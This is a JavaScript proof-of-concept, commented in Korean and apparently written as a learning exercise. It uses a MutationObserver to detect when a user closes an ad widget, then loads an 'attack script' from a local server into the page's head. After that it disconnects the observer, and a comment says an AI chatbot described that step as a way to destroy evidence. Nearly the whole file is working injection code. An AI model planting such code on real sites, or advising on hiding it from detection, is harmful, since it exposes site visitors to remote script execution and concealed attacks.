const statusEl = document.getElementById("status");//id=status 상태체크용 객체 생성(상태창 같은 놈임)
const INJECT_SRC = "http://localhost:4000/injected.js";//공격 스크립트의 주소

//id=status인 객체가 있는지 확인하고 계속해서 객체의 상태메시지를 최신화 하는 용도
function setStatus(msg) {
  if (statusEl) statusEl.textContent = msg;
}

//스크립트를 주입해두는 함수, 실행은 브라우저가 하는 거임(DOM 기반 탐색이 필요한 이유)
function injectOnce() {
  //중복주입 방지
  if (window.__POC_INJECTED__) {
    console.log("이미 전역에 주입 기록이 존재합니다.");
    return;
  }
  window.__POC_INJECTED__ = true;//F12에서 스크립트가 주입된 상태인지 확인하기에도 좋겠네요.

  //script 객체 생성(엄밀히 말하면 injected.js가 들어간 객체)
  const s = document.createElement("script");
  s.src = `${INJECT_SRC}?ts=${Date.now()}`;//뒤에 date.now를 붙여서 브라우저가 캐시를 쓰는걸 방지한다고 하더라구요. 처음 알았습니다.
  s.async = true;
  s.onload = () => setStatus("Injected script loaded (badge should appear)");
  s.onerror = () => setStatus("Injected script load error");
  document.head.appendChild(s);//html에서 head 바로 밑에 붙이기

  setStatus("Injecting injected.js …");
}

//mutationObserver 응용(감시자 객체 생성)
const obs = new MutationObserver((mutations) => {
  for (const m of mutations) {//mutations가 배열 형식의 객체라서 하나씩 꺼내서 조회하는 구조
    for (const n of m.removedNodes) {//삭제된 요소들만 추려서 다시 조회
      if (n && n.nodeType === 1 && n.id === "adWidgetContainer") {//삭제가 됐는지, 삭제된 놈이 HTML 태그 요소인지, 삭제된 태그의 id가 adWidgetContainer인지 확인하고 맞으면 밑에 함수 실행
        setStatus("Ad closed detected → injecting …");
        injectOnce();
        obs.disconnect();//감시종료(구현 안해도 되는데, GPT가 증거인멸로 사용된다고 해서 넣어봤습니다. 사실 탐지쪽에 영향을 줄지는 잘 모르겠어요.)
        return;
      }
    }
  }
});

document.addEventListener("DOMContentLoaded", () => {
  setStatus("Ready. (waiting for ad close)");
  obs.observe(document.documentElement, { childList: true, subtree: true });//감시자 객체에 감시대상 설정. 걍 자식노드 서브트리 전부 감시하쇼
});
